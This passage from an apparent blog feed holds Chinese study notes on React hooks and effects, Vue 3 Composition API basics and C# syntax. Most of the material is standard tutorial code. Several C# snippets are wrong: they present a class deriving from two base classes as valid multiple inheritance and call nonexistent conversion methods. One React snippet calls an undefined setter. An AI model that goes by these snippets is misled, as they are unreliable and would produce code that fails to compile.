[&#123;<span class="attr">id</span>: <span class="number">0</span>, <span class="attr">text</span>: <span class="string">'参观卡夫卡博物馆'</span>, <span class="attr">done</span>: <span class="literal">true</span>&#125;];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">tasksReducer</span>(<span class="params">tasks, action</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (action.type === <span class="string">'add'</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> [</span><br><span class="line">      ...tasks,</span><br><span class="line">      &#123;</span><br><span class="line">        id: action.id,</span><br><span class="line">        text: action.text,</span><br><span class="line">      &#125;,</span><br><span class="line">    ];</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">App</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> [tasks, dispatch] = useReducer(tasksReducer, initialTasks);</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">handleAddTask</span>(<span class="params">text</span>) </span>&#123;</span><br><span class="line">    dispatch(&#123; <span class="attr">type</span>: <span class="string">'add'</span>, text &#125;)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="2-3-useContext"><a href="#2-3-useContext" class="headerlink" title="2.3 useContext"></a>2.3 useContext</h4><p>Context 允许父组件向其下层无论多深的任何组件提供信息<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; createContext, useContext &#125; <span class="keyword">from</span> <span class="string">'react'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> LevelContext = createContext(<span class="number">1</span>); <span class="comment">// 创建context</span></span><br><span class="line"><span class="keyword">const</span> level = useContext(LevelContext); <span class="comment">// 把 context 传递给 useContext hook来读取它</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="function"><span class="keyword">function</span> <span class="title">Section</span>(<span class="params">&#123; level, children &#125;</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    &#123;<span class="comment">/* 在父组件中，用 context.Provider来为子组件提供context */</span>&#125;</span><br><span class="line">    &lt;LevelContext.Provider value=&#123;level&#125;&gt;</span><br><span class="line">      &#123;children&#125;</span><br><span class="line">    &lt;<span class="regexp">/LevelContext.Provider&gt;</span></span><br><span class="line"><span class="regexp">  );</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">/</span><span class="regexp">/ 在子组件中，用useContext来读取它</span></span><br><span class="line"><span class="regexp">const level = useContext(LevelContext);</span></span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="2-4-Reducer-Context"><a href="#2-4-Reducer-Context" class="headerlink" title="2.4 Reducer + Context"></a>2.4 Reducer + Context</h4><p>结合reducer和Context，<em>相当于vue里的provide和inject</em><br>state 存在于顶层组件中，由 useReducer 进行管理。子组件可以轻松获取获取 state数据 和 dispatch。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; createContext, useReducer &#125; <span class="keyword">from</span> <span class="string">'react'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> TasksContext = createContext(<span class="literal">null</span>);</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> TasksDispatchContext = createContext(<span class="literal">null</span>);</span><br><span class="line"><span class="keyword">export</span> <span class="function"><span class="keyword">function</span> <span class="title">TasksProvider</span>(<span class="params">&#123; children &#125;</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> [tasks, dispatch] = useReducer(tasksReducer, initialTasks);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    &lt;TasksContext.Provider value=&#123;tasks&#125;&gt;</span><br><span class="line">      &lt;TasksDispatchContext.Provider value=&#123;dispatch&#125;&gt;</span><br><span class="line">        &#123;children&#125;</span><br><span class="line">      &lt;<span class="regexp">/TasksDispatchContext.Provider&gt;</span></span><br><span class="line"><span class="regexp">    &lt;/</span>TasksContext.Provider&gt;</span><br><span class="line">  );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 组件中获取task和dispatch</span></span><br><span class="line"><span class="keyword">const</span> dispatch = useContext(TasksDispatchContext);</span><br><span class="line"><span class="keyword">const</span> tasks = useContext(TasksContext);</span><br></pre></td></tr></table></figure></p><p>也可以再封装一层<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="function"><span class="keyword">function</span> <span class="title">useTasks</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> useContext(TasksContext);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">export</span> <span class="function"><span class="keyword">function</span> <span class="title">useTasksDispatch</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> useContext(TasksDispatchContext);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> tasks = useTasks();</span><br><span class="line"><span class="keyword">const</span> dispatch = useTasksDispatch();</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="2-5-useRef"><a href="#2-5-useRef" class="headerlink" title="2.5 useRef"></a>2.5 useRef</h4><p>和state一样，React会在每次渲染时保留ref, 但设置state会重新渲染组件，ref不会。<br>当你希望组件“记住”某些信息，但又不想让这些信息 触发新的渲染 时，你可以使用 ref 。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ref会返回这样一个对象 &#123; current: 0 &#125; ，current表示当前值</span></span><br><span class="line"><span class="keyword">const</span> ref = useRef(<span class="number">0</span>); </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">handleClick</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  ref.current = ref.current + <span class="number">1</span>;</span><br><span class="line">  alert(<span class="string">'你点击了 '</span> + ref.current + <span class="string">' 次！'</span>); <span class="comment">// 1, 2, 3...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><code>ref</code>可以指向任何值，常用于存储和操作DOM元素<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; useRef &#125; <span class="keyword">from</span> <span class="string">'react'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> myRef = useRef(<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将ref传递给DOM节点</span></span><br><span class="line">&lt;div ref=&#123;myRef&#125;&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 访问DOM</span></span><br><span class="line">myRef.current.scrollIntoView();</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="2-6-useCallback"><a href="#2-6-useCallback" class="headerlink" title="2.6 useCallback"></a>2.6 useCallback</h4><p>在多次渲染中缓存函数，避免不必要的渲染。<br>第二个参数是函数内部需要用到的依赖值<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> handleSubmit = useCallback(<span class="function">(<span class="params">orderDetails</span>) =&gt;</span> &#123;</span><br><span class="line">  post(<span class="string">'/product/'</span> + productId + <span class="string">'/buy'</span>, &#123;</span><br><span class="line">    referrer,</span><br><span class="line">    orderDetails,</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;, [productId, referrer]);</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="2-7-useMemo"><a href="#2-7-useMemo" class="headerlink" title="2.7 useMemo"></a>2.7 useMemo</h4><p>在每次重新渲染的时候能够缓存计算的结果。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> cachedValue = useMemo(calculateValue, dependencies)</span><br></pre></td></tr></table></figure></p><p><br></p><h3 id="3-Effect"><a href="#3-Effect" class="headerlink" title="3. Effect"></a>3. Effect</h3><p>允许你指定由渲染本身，而不是特定交互引起的副作用，如用于渲染的网络请求、对DOM节点进行操作</p><ul><li><p>执行时机</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">useEffect(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="comment">// 这里的代码会在每次渲染后执行</span></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">useEffect(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="comment">// 这里的代码只会在组件挂载后执行</span></span><br><span class="line">  <span class="built_in">window</span>.addEventListener(<span class="string">'scroll'</span>, handleScroll);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 清理函数: 每次重新执行Effect前，组件被卸载时，都会调用清理函数</span></span><br><span class="line">  <span class="keyword">return</span> <span class="function"><span class="params">()</span> =&gt;</span> <span class="built_in">window</span>.removeEventListener(<span class="string">'scroll'</span>, handleScroll);</span><br><span class="line">&#125;, []);</span><br><span class="line"></span><br><span class="line">useEffect(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="comment">//这里的代码只会在每次渲染后，并且 a 或 b 的值与上次渲染不一致时执行</span></span><br><span class="line">&#125;, [a, b]);</span><br></pre></td></tr></table></figure></li><li><p>清理函数<code>return () =&gt; {}</code>，常用于</p><ul><li>取消订阅</li><li>重置初始值</li><li>取消或者对正在进行中的异步操作作标记</li></ul></li><li><p>你可能不需要effect</p><ol><li><p>能<code>computed</code>计算出来的数据，不需要放进<code>useEffect</code></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> [firstName, setFirstName] = useState(<span class="string">'Taylor'</span>);</span><br><span class="line"><span class="keyword">const</span> [lastName, setLastName] = useState(<span class="string">'Swift'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 🔴 避免：多余的 state 和不必要的 Effect</span></span><br><span class="line">useEffect(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">  setFullName(firstName + <span class="string">' '</span> + lastName);</span><br><span class="line">&#125;, [firstName, lastName]);</span><br><span class="line"></span><br><span class="line"><span class="comment">// ✅ 非常好：在渲染期间进行计算</span></span><br><span class="line"><span class="keyword">const</span> fullName = firstName + <span class="string">' '</span> + lastName;</span><br></pre></td></tr></table></figure></li><li><p>有条件的<code>computed</code>, 使用<code>useMemo</code>代替<code>useEffect</code></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 🔴 避免：多余的 state 和不必要的 Effect</span></span><br><span class="line"><span class="keyword">const</span> [visibleTodos, setVisibleTodos] = useState([]);</span><br><span class="line">useEffect(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">  setVisibleTodos(getFilteredTodos(todos, filter));</span><br><span class="line">&#125;, [todos, filter]);</span><br><span class="line"></span><br><span class="line"><span class="comment">// ✅ 除非 todos 或 filter 发生变化，否则不会重新执行 getFilteredTodos()</span></span><br><span class="line"><span class="keyword">const</span> visibleTodos = useMemo(<span class="function"><span class="params">()</span> =&gt;</span> getFilteredTodos(todos, filter), [todos, filter]);</span><br></pre></td></tr></table></figure></li><li><p>当props变化需要调整state时，不需要放进<code>useEffect</code></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">List</span>(<span class="params">&#123; items &#125;</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> [isReverse, setIsReverse] = useState(<span class="literal">false</span>);</span><br><span class="line">  <span class="keyword">const</span> [selectedId, setSelectedId] = useState(<span class="literal">null</span>);</span><br><span class="line">  <span class="comment">// 🔴 避免：当 prop 变化时，在 Effect 中调整 state</span></span><br><span class="line">  useEffect(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    setSelection(<span class="literal">null</span>);</span><br><span class="line">  &#125;, [items]);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// ✅ 非常好：在渲染期间计算所需内容</span></span><br><span class="line">  <span class="keyword">const</span> selection = items.find(<span class="function"><span class="params">item</span> =&gt;</span> item.id === selectedId) ?? <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol></li></ul><p><br></p><p><br></p><h3 id="4-API"><a href="#4-API" class="headerlink" title="4. API"></a>4. API</h3><h4 id="4-1-forwardRef"><a href="#4-1-forwardRef" class="headerlink" title="4.1 forwardRef"></a>4.1 forwardRef</h4><p>允许父节点访问子组件里的DOM元素<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; forwardRef &#125; <span class="keyword">from</span> <span class="string">'react'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> MyInput = forwardRef(<span class="function"><span class="keyword">function</span> <span class="title">MyInput</span>(<span class="params">props, ref</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> &#123; label, ...otherProps &#125; = props;</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    &lt;label&gt;</span><br><span class="line">      &#123;label&#125;</span><br><span class="line">      &lt;input &#123;...otherProps&#125; ref=&#123;ref&#125; /&gt;</span><br><span class="line">    &lt;<span class="regexp">/label&gt;</span></span><br><span class="line"><span class="regexp">  );</span></span><br><span class="line"><span class="regexp">&#125;);</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">function Form() &#123;</span></span><br><span class="line"><span class="regexp">  const ref = useRef(null);</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">  function handleClick() &#123;</span></span><br><span class="line"><span class="regexp">    ref.current.focus();</span></span><br><span class="line"><span class="regexp">  &#125;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">  return (</span></span><br><span class="line"><span class="regexp">    &lt;form&gt;</span></span><br><span class="line"><span class="regexp">      &lt;MyInput label="Enter your name:" ref=&#123;ref&#125; /</span>&gt;</span><br><span class="line">      &lt;button type=<span class="string">"button"</span> onClick=&#123;handleClick&#125;&gt;</span><br><span class="line">        编辑</span><br><span class="line">      &lt;<span class="regexp">/button&gt;</span></span><br><span class="line"><span class="regexp">    &lt;/</span>form&gt;</span><br><span class="line">  );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="4-2-lazy"><a href="#4-2-lazy" class="headerlink" title="4.2 lazy"></a>4.2 lazy</h4><p>声明一个组件<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> MarkdownPreview <span class="keyword">from</span> <span class="string">'./MarkdownPreview.js'</span>;</span><br></pre></td></tr></table></figure></p><p>声明一个懒加载的 React 组件<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; lazy &#125; <span class="keyword">from</span> <span class="string">'react'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> MarkdownPreview = lazy(<span class="function"><span class="params">()</span> =&gt;</span> <span class="keyword">import</span>(<span class="string">'./MarkdownPreview.js'</span>));</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="4-3-memo"><a href="#4-3-memo" class="headerlink" title="4.3 memo"></a>4.3 memo</h4><p>允许你的组件在 props 没有改变的情况下跳过重新渲染。<br>使用 memo 将组件包装起来，以获得该组件的一个 记忆化 版本。通常情况下，只要该组件的 props 没有改变，这个记忆化版本就不会在其父组件重新渲染时重新渲染。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; memo &#125; <span class="keyword">from</span> <span class="string">'react'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> SomeComponent = memo(<span class="function"><span class="keyword">function</span> <span class="title">SomeComponent</span>(<span class="params">props</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p><p><br></p><p><br></p><h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><ul><li><a href="https://react.docschina.org/" target="_blank" rel="noopener">React官网</a></li></ul>]]></content>
      
      <categories>
          
          <category> React </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Vue3 基本用法</title>
      <link href="/2025/01/25/vue3/"/>
      <url>/2025/01/25/vue3/</url>
      <content type="html"><![CDATA[<ul><li><h3 id="1-setup"><a href="#1-setup" class="headerlink" title="1. setup"></a>1. setup</h3></li><li>渐进式框架<br>选项式 API (Options API) + 组合式 API (Composition API)</li></ul><p><code>setup()</code>内的代码会在在Options API所有东西之前执行<br><code>&lt;script setup&gt;&lt;/script&gt;</code></p><p><br></p><h3 id="2-Composition-API"><a href="#2-Composition-API" class="headerlink" title="2. Composition API"></a>2. Composition API</h3><h4 id="2-1-ref"><a href="#2-1-ref" class="headerlink" title="2.1 ref"></a>2.1 ref</h4><p>声明响应式状态<br>为什么ref会带有<code>.value</code><br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; ref &#125; <span class="keyword">from</span> <span class="string">'vue'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">  setup() &#123;</span><br><span class="line">    <span class="keyword">const</span> count = ref(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">increment</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">      count.value++</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">      count,</span><br><span class="line">      increment</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h4 id="2-2-reactive"><a href="#2-2-reactive" class="headerlink" title="2.2 reactive"></a>2.2 reactive</h4><p>为什么要用<code>reactive</code></p><h4 id="2-3-computed"><a href="#2-3-computed" class="headerlink" title="2.3 computed"></a>2.3 computed</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> publishedBooksMessage = computed(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> author.books.length &gt; <span class="number">0</span> ? <span class="string">'Yes'</span> : <span class="string">'No'</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h4 id="2-4-watch"><a href="#2-4-watch" class="headerlink" title="2.4 watch"></a>2.4 watch</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> x = ref(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">watch(x, (newX) =&gt; &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">`x is <span class="subst">$&#123;newX&#125;</span>`</span>)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h4 id="2-5-ref"><a href="#2-5-ref" class="headerlink" title="2.5 ref"></a>2.5 ref</h4><p>引用子组件<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; useTemplateRef, onMounted &#125; <span class="keyword">from</span> <span class="string">'vue'</span></span><br><span class="line"><span class="keyword">import</span> Child <span class="keyword">from</span> <span class="string">'./Child.vue'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> childRef = useTemplateRef(<span class="string">'child'</span>)</span><br><span class="line"></span><br><span class="line">onMounted(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="comment">// childRef.value 将持有 &lt;Child /&gt; 的实例</span></span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;Child ref=<span class="string">"child"</span> /&gt;</span><br><span class="line">&lt;<span class="regexp">/template&gt;</span></span><br></pre></td></tr></table></figure></p><h3 id="3-生命周期"><a href="#3-生命周期" class="headerlink" title="3. 生命周期"></a>3. 生命周期</h3><ul><li>onMounted</li><li>onUpdated</li><li>onUnmounted</li></ul>]]></content>
      
      
    </entry>
    
    <entry>
      <title>C#语法</title>
      <link href="/2025/01/03/C%20sheel%E8%AF%AD%E6%B3%95/"/>
      <url>/2025/01/03/C%20sheel%E8%AF%AD%E6%B3%95/</url>
      <content type="html"><![CDATA[<h3 id="1-命名空间"><a href="#1-命名空间" class="headerlink" title="1. 命名空间"></a>1. 命名空间</h3><p>命名空间的设计目的是提供一种让一组名称与其他名称分隔开的方式<br><code>using System;</code> using 关键字用于在程序中包含 System 命名空间<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">using System;</span><br><span class="line">namespace first_space</span><br><span class="line">&#123;</span><br><span class="line">   class namespace_cl</span><br><span class="line">   &#123;</span><br><span class="line">      public void func()</span><br><span class="line">      &#123;</span><br><span class="line">         Console.WriteLine(&quot;Inside first_space&quot;);</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><br></p><h3 id="2-class"><a href="#2-class" class="headerlink" title="2. class"></a>2. class</h3><p>程序的执行从 Main 方法开始。</p><ul><li>访问修饰符：定义类成员的范围和可见性<br>public：所有对象都可以访问；<br>internal：同一个程序集的对象可以访问；<br>protected：只有该类对象及其子类对象可以访问<br>private：对象本身在对象内部可以访问；</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BaseClass</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">  public <span class="keyword">void</span> SomeMethod() &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 继承，多重继承</span></span><br><span class="line">class DerivedClass : BaseClass, OtherClass</span><br><span class="line">&#123;</span><br><span class="line">  public <span class="keyword">void</span> AnotherMethod()</span><br><span class="line">  &#123;</span><br><span class="line">    base.SomeMethod();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><br></p><h3 id="3-数据类型"><a href="#3-数据类型" class="headerlink" title="3. 数据类型"></a>3. 数据类型</h3><table><thead><tr><th>类型</th><th style="text-align:center">举例</th></tr></thead><tbody><tr><td>整数类型</td><td style="text-align:center">sbyte、byte、short、ushort、int、uint、long、ulong 和 char</td></tr><tr><td>浮点型</td><td style="text-align:center">float, double</td></tr><tr><td>十进制类型</td><td style="text-align:center">decimal</td></tr><tr><td>布尔类型</td><td style="text-align:center">true 或 false 值，指定的值</td></tr><tr><td>空字符串</td><td style="text-align:center">string</td></tr><tr><td>空类型</td><td style="text-align:center">null</td></tr><tr><td>动态类型</td><td style="text-align:center">dynamic(允许在运行时推断变量的类型)</td></tr><tr><td>类</td><td style="text-align:center">class</td></tr><tr><td>数组</td><td style="text-align:center"><em><code>datatype[] arrayName</code></em>, 如<code>double[] arr = new double[10]</code></td></tr></tbody></table><ul><li>类型转换方法<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">int i = 75;</span><br><span class="line">Console.WriteLine(i.ToString());</span><br><span class="line">i.ToBoolean();</span><br><span class="line">i.ToByte();</span><br><span class="line">i.toDouble();</span><br><span class="line">Convert.ToBoolean(i); // 转换为Boolean</span><br><span class="line">Boolean.Parse(string); // 将字符串解析为Boolean</span><br></pre></td></tr></table></figure></li></ul><h3 id="4-常见方法"><a href="#4-常见方法" class="headerlink" title="4. 常见方法"></a>4. 常见方法</h3><ul><li><p>运算符<br>+, -, <em>, /, %, ++, –, ==, !=, &gt;, &lt;, &gt;=, &lt;=, &amp;&amp;, ||, !, =, +=, -=, </em>=, /=, %=</p></li><li><p>判断</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">if () &#123;&#125;;</span><br><span class="line">if () &#123;&#125; esle &#123;&#125;;</span><br><span class="line">if () &#123;&#125; else if () &#123;&#125;;</span><br><span class="line">Exp1 ? Exp2 : Exp3;</span><br><span class="line">switch(expression)&#123;</span><br><span class="line">  case constant-expression  :</span><br><span class="line">    statement(s);</span><br><span class="line">    break; </span><br><span class="line">  default :</span><br><span class="line">    statement(s);</span><br><span class="line">    break; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>循环</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 